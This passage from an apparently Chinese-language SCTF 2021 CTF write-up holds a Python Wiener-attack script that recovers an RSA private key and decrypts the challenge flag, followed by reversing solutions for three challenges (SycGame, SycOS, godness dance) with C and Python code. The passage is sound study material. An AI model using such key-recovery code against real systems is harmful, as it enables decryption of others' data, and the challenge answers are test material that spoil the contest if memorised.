y</span>): </span><br><span class="line"></span><br><span class="line">    a = x // y </span><br><span class="line"></span><br><span class="line">    quotients = [a] </span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> a * y != x: </span><br><span class="line"></span><br><span class="line">        x, y = y, x - a * y </span><br><span class="line"></span><br><span class="line">        a = x // y </span><br><span class="line"></span><br><span class="line">        quotients.append(a) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> quotients </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents_from_quotients</span>(<span class="params">quotients</span>): </span><br><span class="line"></span><br><span class="line">    convergents = [(quotients[<span class="number">0</span>], <span class="number">1</span>)] </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(quotients) + <span class="number">1</span>): </span><br><span class="line"></span><br><span class="line">        quotients_partion = quotients[<span class="number">0</span>:i] </span><br><span class="line"></span><br><span class="line">        denom = quotients_partion[-<span class="number">1</span>]  <span class="comment"># 分母 </span></span><br><span class="line"></span><br><span class="line">        num = <span class="number">1</span> </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>, -<span class="built_in">len</span>(quotients_partion), -<span class="number">1</span>): </span><br><span class="line"></span><br><span class="line">            num, denom = denom, quotients_partion[_] * denom + num </span><br><span class="line"></span><br><span class="line">        num += denom * quotients_partion[<span class="number">0</span>] </span><br><span class="line"></span><br><span class="line">        convergents.append((num, denom)) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> convergents </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">WienerAttack</span>(<span class="params">e, n</span>): </span><br><span class="line"></span><br><span class="line">    quotients = rational_to_quotients(e, n) </span><br><span class="line"></span><br><span class="line">    convergents = convergents_from_quotients(quotients) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents: </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">and</span> <span class="keyword">not</span> (e * d - <span class="number">1</span>) % k: </span><br><span class="line"></span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k </span><br><span class="line"></span><br><span class="line">            <span class="comment"># check if (x^2 - coef * x + n = 0) has integer roots </span></span><br><span class="line"></span><br><span class="line">            coef = n - phi + <span class="number">1</span> </span><br><span class="line"></span><br><span class="line">            delta = coef * coef - <span class="number">4</span> * n </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> delta &gt; <span class="number">0</span> <span class="keyword">and</span> gmpy2.iroot(delta, <span class="number">2</span>)[<span class="number">1</span>] == <span class="literal">True</span>: </span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> d </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">P, Q, mod</span>): </span><br><span class="line"></span><br><span class="line">    x1, y1 = P </span><br><span class="line"></span><br><span class="line">    x2, y2 = Q </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> x2 <span class="keyword">is</span> <span class="literal">None</span>: </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> P </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> x1 <span class="keyword">is</span> <span class="literal">None</span>: </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Q </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> y1 <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> y2 <span class="keyword">is</span> <span class="literal">None</span>: </span><br><span class="line"></span><br><span class="line">        x = x1 * x2 % mod </span><br><span class="line"></span><br><span class="line">        y = (x1 + x2) % mod </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (x, y) </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> y1 <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> y2 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: </span><br><span class="line"></span><br><span class="line">        x1, y1, x2, y2 = x2, y2, x1, y1 </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> y2 <span class="keyword">is</span> <span class="literal">None</span>: </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (y1 + x2) % mod != <span class="number">0</span>: </span><br><span class="line"></span><br><span class="line">            x = (x1 * x2 + <span class="number">2</span>) * inverse(y1 + x2, mod) % mod </span><br><span class="line"></span><br><span class="line">            y = (x1 + y1 * x2) * inverse(y1 + x2, mod) % mod </span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (x, y) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> (x1 - y1 ** <span class="number">2</span>) % mod != <span class="number">0</span>: </span><br><span class="line"></span><br><span class="line">            x = (x1 * x2 + <span class="number">2</span>) * inverse(x1 - y1 ** <span class="number">2</span>, mod) % mod </span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (x, <span class="literal">None</span>) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">None</span>, <span class="literal">None</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (x1 + x2 + y1 * y2) % mod != <span class="number">0</span>: </span><br><span class="line"></span><br><span class="line">            x = (x1 * x2 + (y1 + y2) * <span class="number">2</span>) * inverse(x1 + x2 + y1 * y2, mod) % mod </span><br><span class="line"></span><br><span class="line">            y = (y1 * x2 + x1 * y2 + <span class="number">2</span>) * inverse(x1 + x2 + y1 * y2, mod) % mod </span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (x, y) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> (y1 * x2 + x1 * y2 + <span class="number">2</span>) % mod != <span class="number">0</span>: </span><br><span class="line"></span><br><span class="line">            x = (x1 * x2 + (y1 + y2) * <span class="number">2</span>) * inverse(y1 * x2 + x1 * y2 + <span class="number">2</span>, mod) % mod </span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (x, <span class="literal">None</span>) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">None</span>, <span class="literal">None</span>) </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myPower</span>(<span class="params">P, a, mod</span>): </span><br><span class="line"></span><br><span class="line">    target = (<span class="literal">None</span>, <span class="literal">None</span>) </span><br><span class="line"></span><br><span class="line">    t = P </span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> a &gt; <span class="number">0</span>: </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> a % <span class="number">2</span>: </span><br><span class="line"></span><br><span class="line">            target = add(target, t, mod) </span><br><span class="line"></span><br><span class="line">        t = add(t, t, mod) </span><br><span class="line"></span><br><span class="line">        a &gt;&gt;= <span class="number">1</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> target </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">e = <span class="number">4900663392474333511021274640586676041190209685334279465644481953732654820007817465784732552403161544491127978960528622855662226436013278818654816634231988610344582782186016441780833459265436490192924918161499546130585534712016341883862636292562878766223441301439228458011482886280440623319855294068082796058072724036574171831263278231498144433634711174601580662800543021165022020993826916028784897066067245828422668690991474561604415237342722134303009211975140707793593659250476825594367676528487883099797429162461388379576349794949052029036932537743737882862455041914136992742454025785618036422947521579196419682673</span> </span><br><span class="line"></span><br><span class="line">N = <span class="number">16747204882417711556566528921331201720409686477045148358102407358649177037162364757337579737480709279957814538616282656834391036843801973604436858315398426544680221288140414500707975771367683893038710797912471910646361535977073670535351131336367114860464749825264434600778157181779675957160461431719021503108817300190687402628173857695242091154625300957259974276165473530538699640521880788598671262492360267197522031691979305758467455462308866998372462867278079383311005053482404930635325015230152289437841471244731705014411625162283665596766705850908703578792897039321331779312997615919261149792657373096116865329681</span> </span><br><span class="line"></span><br><span class="line">cipher = (<span class="number">1502537198037412138959404925273947125135815733714613113514320632189593377751418476234621558490959338311604744450862970281032410900602855827915451892812987364777765959947084373897245818509290955227026042711684121325311823058498537239012028561792486103281876155615838531477852906000341526557222599310995739831543658223880935572087312742332183395367851697095266248237233506401316404436470875195714876017630583057770038474875796980993028217458408971552567154328292460799613025812259659231108327829165282506352092076311191840744613851846363317595941811588179124381597704935053201484470162263659131968489028564549622533697954537751062579586560414593976837419255907900029822338445737875577148140312280440226776902211723292101877348185901719741368457958588921796200981975075293129980056841456107867653473926640266384852447661565261302935222903023606406288336953609068541701972215445007377344441511973422565646147322055069598488293931</span>, <span class="number">1011403345603727408945876921250066820314220339105409921963107559195469502064003760326598913179366575981301702956740453627420761328713409390410661289472471898555514549526488404880640921605411282791715962933303870043871446613392022087329011550301515712639691076925568594867583281055065644358838017936361812762277354217939625893846603092627092038863632584999212161084360711665335337867672785946059549908812080484214952167276959823859872433687012399699321821628902087613134849101298661182346870557214136938336080489056200804879187330910338994984002258978932867300612824944744731909867671800598959017549057154534956670423369755122935318059535865610235297367836119658331560061846307081157317985910548447143673273543728783307221862568130810339529595961095105799484367002894090836242935087629943182476006427583114853476474037533007772721440732363420948049914690375136821227018708695289507462018947270591332826564337207730588105092063</span>) </span><br><span class="line"></span><br><span class="line">padding = <span class="number">105633841121800385495299323793575525757662062720618660464374134421074511358214855668399510418917564552735810735896127683524211092138747188289947813061924731524251612980721176172871908031798142300682065573614320720911139764848510512663864510199192378016664027839477108506581437250078083046615135331808942191529</span> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">d = WienerAttack(e, N) </span><br><span class="line"></span><br><span class="line">p, q = RSAdecompose(N, e * d) </span><br><span class="line"></span><br><span class="line">msg = myPower(cipher, inverse(e, (p ** <span class="number">3</span> - <span class="number">1</span>)), p) </span><br><span class="line">flag = long_to_bytes(msg[<span class="number">0</span>]) + long_to_bytes(msg[<span class="number">1</span>]) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h1><span id="rev">Rev</span><a href="#rev" class="header-anchor"></a></h1><h3><span id="sycgame"><strong>SycGame</strong></span><a href="#sycgame" class="header-anchor"></a></h3><p>逆向后得出是一个推箱子游戏，给出 flag 的条件是连续玩游戏赢 5 次。</p>
<p>游戏的流程为：</p>
<ol>
<li>生成一个固定的长度为 3001 的数组，数组值为 0 或 1。</li>
<li>随机生成一个 20 x 20 大小的地图，地图上有一些正整数和 -1、-2、-3。如果是 -1 则是箱子，-2 是玩家位置，-3 是箱子的目的地。如果是正整数则对应回第 1 步所得的数组小下标，如果是 0 就是不能走，1 就是可以走。</li>
<li>将地图作为一个长度为 400 的列表输出。</li>
<li>读入 w、a、s、d 的输入，根据输入移动玩家位置。如果玩家位置移动的方向有箱子，则将箱子同方向移动（推箱子）；如果箱子移动的方向有目的地，则将箱子推到目的地上并给一个计数器 +1。如果箱子从目的地上被推开了则将计数器 -1。</li>
<li>当计数器的值等于箱子的数量则游戏胜利，否则如果玩家走到了不能走的地方或者非法输入则游戏失败。</li>
</ol>
<p>搞懂了这个之后剩下就是写算法玩游戏了。因为箱子和目的地没有特定的关系（任何箱子推到任何目的地都算成功），所以我们直接用贪心和 BFS 来搜索。具体方式是先选一个没有处理过的箱子，接着 BFS 搜到最近的目的地（搜索的时候保证推的方向的反方向格子是可以走到的）。得到路径后，对于每一个推的操作，从玩家当前位置 BFS 搜到推箱子操作的反方向，然后推箱子。重复这个过程直到箱子被推到终点，然后将箱子的位置设成不能走，保证以后不会不小心碰到箱子。最后重复整个过程直到所有箱子被推到终点。</p>
<p>程序生成的地图不保证有解，包括我们的算法也处理不了一些特殊情况，所以有时候搜不出来解。还有一些程序本身的 bug，比如不能走到 -3 或者 -2 的上面，导致算法有时候会与程序的模拟不一致。不过只要我们有获胜的概率，我们可以重复游玩，直到连续五次胜利。这个概率不算太高，不过玩大概 200 盘左右就有一次，所以我们直接失败重开，最后成功拿到 flag。</p>
<h3><span id="sycos"><strong>SycOS</strong></span><a href="#sycos" class="header-anchor"></a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line"></span><br><span class="line">#include &lt;stdint.h&gt;  </span><br><span class="line"></span><br><span class="line">uint64_t d_2ec8 = 0;</span><br><span class="line"></span><br><span class="line">uint8_t d_2ed8[0x80 * 0x20];</span><br><span class="line"></span><br><span class="line">uint8_t d_2ed0[0x80 * 0x20];</span><br><span class="line"></span><br><span class="line">uint8_t fakerandom() &#123;</span><br><span class="line"></span><br><span class="line">        d_2ec8 = d_2ec8 * 0x41c64e6d + 0x3039;</span><br><span class="line"></span><br><span class="line">        //printf(&quot;d_2ec8 = 0x%llx\n&quot;, d_2ec8);</span><br><span class="line"></span><br><span class="line">        return (uint8_t)((d_2ec8 &lt;&lt; 0x21) &gt;&gt; 0x31);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void encrypt(uint32_t* v, uint32_t* k) &#123;</span><br><span class="line"></span><br><span class="line">        uint32_t v0 = v[0], v1 = v[1], sum = 0, i;           /* set up */</span><br><span class="line"></span><br><span class="line">        uint32_t delta = 0x9e3779b9;                     /* a key schedule constant */</span><br><span class="line"></span><br><span class="line">        uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];   /* cache key */</span><br><span class="line"></span><br><span class="line">        for (i = 0; i &lt; 16; i++) &#123;                       /* basic cycle start */</span><br><span class="line"></span><br><span class="line">                sum += delta;</span><br><span class="line"></span><br><span class="line">                v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);</span><br><span class="line"></span><br><span class="line">                v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);</span><br><span class="line"></span><br><span class="line">        &#125;                                              /* end cycle */</span><br><span class="line"></span><br><span class="line">        v[0] = v0; v[1] = v1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//解密函数  </span><br><span class="line"></span><br><span class="line">void encrypt1(uint32_t* v, uint32_t* k) &#123;</span><br><span class="line"></span><br><span class="line">        uint32_t v0 = v[0], v1 = v[1], sum =0, i;  /* set up */</span><br><span class="line"></span><br><span class="line">        uint32_t delta = 0x9e3779b9;                     /* a key schedule constant */</span><br><span class="line"></span><br><span class="line">        uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];   /* cache key */</span><br><span class="line"></span><br><span class="line">        for (i = 0; i &lt; 8; i++) &#123;                         /* basic cycle start */</span><br><span class="line"></span><br><span class="line">                v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);</span><br><span class="line"></span><br><span class="line">                v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);</span><br><span class="line"></span><br><span class="line">                sum += delta;</span><br><span class="line"></span><br><span class="line">        &#125;                                              /* end cycle */</span><br><span class="line"></span><br><span class="line">        v[0] = v0; v[1] = v1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void exchange(int index) &#123;</span><br><span class="line"></span><br><span class="line">        uint8_t tmp[0x100];</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; 0x100; ++i)</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">                tmp[i] = d_2ed8[0x100 * index + i];</span><br><span class="line"></span><br><span class="line">                d_2ed8[0x100 * index + i] = d_2ed0[0x100 * (0xf-index) + i];</span><br><span class="line"></span><br><span class="line">                d_2ed0[0x100 * (0xf - index) + i] = tmp[i];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void bigexchange() &#123;</span><br><span class="line"></span><br><span class="line">        uint8_t tmp[0x80 * 0x20];</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; 0x80 * 0x20; ++i) &#123;</span><br><span class="line"></span><br><span class="line">                tmp[i] = d_2ed8[i];</span><br><span class="line"></span><br><span class="line">                d_2ed8[i] = d_2ed0[i];</span><br><span class="line"></span><br><span class="line">                d_2ed0[i] = tmp[i];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">        unsigned char input[0x41] = &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;</span><br><span class="line"></span><br><span class="line">        int var3 = 0x80;</span><br><span class="line"></span><br><span class="line">        int var1 = 0;</span><br><span class="line"></span><br><span class="line">        int var5 = 0;</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; 0x20; i++) &#123;</span><br><span class="line"></span><br><span class="line">                d_2ec8 = input[i] + i;</span><br><span class="line"></span><br><span class="line">                for (int j = 0; j &lt; 0x80; ++j) &#123;</span><br><span class="line"></span><br><span class="line">                        uint8_t tmp = fakerandom();</span><br><span class="line"></span><br><span class="line">                        d_2ed8[0x80 * i + j] = tmp;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; 0x20; ++i) &#123;</span><br><span class="line"></span><br><span class="line">                d_2ec8 = input[0x20 + i] + i;</span><br><span class="line"></span><br><span class="line">                for (int j = 0; j &lt; 0x80; ++j) &#123;</span><br><span class="line"></span><br><span class="line">                        uint8_t tmp = fakerandom();</span><br><span class="line"></span><br><span class="line">                        d_2ed0[0x80 * i + j] = tmp;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for(int index = 0 ; index &lt; 0x10 ; ++index)&#123;</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; 0x1000; i += 8) &#123;</span><br><span class="line"></span><br><span class="line">                uint32_t v[2];</span><br><span class="line"></span><br><span class="line">                uint32_t  key[4] = &#123; 0x11222233 ,0xAABBCCDD, 0x1a2b3c4d,0xcc1122aa &#125;;</span><br><span class="line"></span><br><span class="line">                v[0] = *(uint32_t*)(d_2ed8 + i);</span><br><span class="line"></span><br><span class="line">                v[1] = *(uint32_t*)(d_2ed8 + 4 + i);</span><br><span class="line"></span><br><span class="line">                encrypt(v, key);</span><br><span class="line"></span><br><span class="line">                //        printf(&quot;v0 == %lx v1== %lx&quot;,v[0],v[1]);</span><br><span class="line"></span><br><span class="line">                *(uint32_t*)(d_2ed8 + i) = v[0];</span><br><span class="line"></span><br><span class="line">                *(uint32_t*)(d_2ed8 + 4 + i) = v[1];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; 0x1000; i += 8) &#123;</span><br><span class="line"></span><br><span class="line">                uint32_t v[2];</span><br><span class="line"></span><br><span class="line">                uint32_t  key[4] = &#123; 0x11222233 ,0xAABBCCDD, 0x1a2b3c4d,0xcc1122aa &#125;;</span><br><span class="line"></span><br><span class="line">                v[0] = *(uint32_t*)(d_2ed0 + i);</span><br><span class="line"></span><br><span class="line">                v[1] = *(uint32_t*)(d_2ed0 + 4 + i);</span><br><span class="line"></span><br><span class="line">                encrypt1(v, key);</span><br><span class="line"></span><br><span class="line">                //        printf(&quot;v0 == %lx v1== %lx&quot;,v[0],v[1]);</span><br><span class="line"></span><br><span class="line">                *(uint32_t*)(d_2ed0 + i) = v[0];</span><br><span class="line"></span><br><span class="line">                *(uint32_t*)(d_2ed0 + 4 + i) = v[1];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        exchange(index);</span><br><span class="line"></span><br><span class="line">        bigexchange();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        printf(&quot;d_2ed8 = &quot;);</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; 16; ++i)</span><br><span class="line"></span><br><span class="line">                printf(&quot;%x &quot;,d_2ed8[i]);</span><br><span class="line"></span><br><span class="line">        printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; 16; ++i)</span><br><span class="line"></span><br><span class="line">                printf(&quot;%x &quot;, d_2ed8[0xf*0x100 +i]);</span><br><span class="line"></span><br><span class="line">        printf(&quot;\n d_2ed0= &quot;);</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; 16; ++i)</span><br><span class="line"></span><br><span class="line">                printf(&quot;%x &quot;, d_2ed0[i]);</span><br><span class="line"></span><br><span class="line">        printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; 16; ++i)</span><br><span class="line"></span><br><span class="line">                printf(&quot;%x &quot;, d_2ed0[0xf * 0x100 + i]);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/2021-12-25-SCTF/20211228082941976.jpg" alt="img"></p>
<p>比较的数在1ec8 ec8 ghidra 打开sctf看一下就行 前面的代码是它的加密流程</p>
<h3><span id="godness-dance">godness dance</span><a href="#godness-dance" class="header-anchor"></a></h3><p>逆向发现，程序输入一个长度 28 的字符串，如果符合条件，就会包裹到 <code>SCTF&#123;&#125;</code> 内然后输出。因此这个字符串就是 flag 的核心部分。</p>
<p>首先，程序会做第一部分的检查，根据逻辑，统计每个字符出现的次数，然后跟一个预置的列表进行比较，如果发现不相等，就打印 “count wrong”。因此通过这里可以得到每个字符出现的次数列表。</p>
<p>实际情况是，只允许小写字母，而且大部分出现次数都是 1，少量字母可以出现 2 次。</p>
<p>到这一步，我们可以判断出 flag 是 <code>abcdefghiijklmnopqrstuuvwxyz</code> 的某个排列。</p>
<p>接下来，有一个函数把 flag 传进去，然后做了一系列操作算出来一个数组，最后跟一个预置的全局数组进行对比，只有完全相等才能通过。因此主要是逆向这个函数。</p>
<p>这个函数中间有一大坨代码是让人不太想看的，但是好在一眼看过去，只有一些 shuffle 相关和统计相关的部分，没有特别复杂的逻辑出现。此外，观察到最终的 check 数组是从 0-28 的一个排列，因此猜测只是在表达每个字符的对应位置。</p>
<p>通过 gdb 尝试来输入几个测试例子，尝试换一换字母的顺序更加印证了这一点。</p>
<p>于是尝试写一段代码来恢复:</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">charset = b<span class="string">&#x27;abcdefghiijklmnopqrstuuvwxyz&#x27;</span></span><br><span class="line"></span><br><span class="line">seq = [<span class="number">0x2</span>, <span class="number">0x1A</span>, <span class="number">0x11</span>, <span class="number">0x1C</span>, <span class="number">0x18</span>, <span class="number">0x0B</span>, <span class="number">0x15</span>, <span class="number">0x0A</span>, <span class="number">0x10</span>, <span class="number">0x14</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x3</span>, <span class="number">0x8</span>, <span class="number">0x6</span>, <span class="number">0x0C</span>, <span class="number">0x9</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x16</span>, <span class="number">0x4</span>, <span class="number">0x1B</span>, <span class="number">0x0F</span>, <span class="number">0x17</span>, <span class="number">0x1</span>, <span class="number">0x19</span>, <span class="number">0x7</span>, <span class="number">0x5</span>]</span><br><span class="line"></span><br><span class="line">flag = [<span class="symbol">None</span>] * <span class="number">29</span></span><br><span class="line"></span><br><span class="line">for i, e in enumerate(seq):</span><br><span class="line"></span><br><span class="line">    flag[e] = charset[i]</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">print(bytes(flag[<span 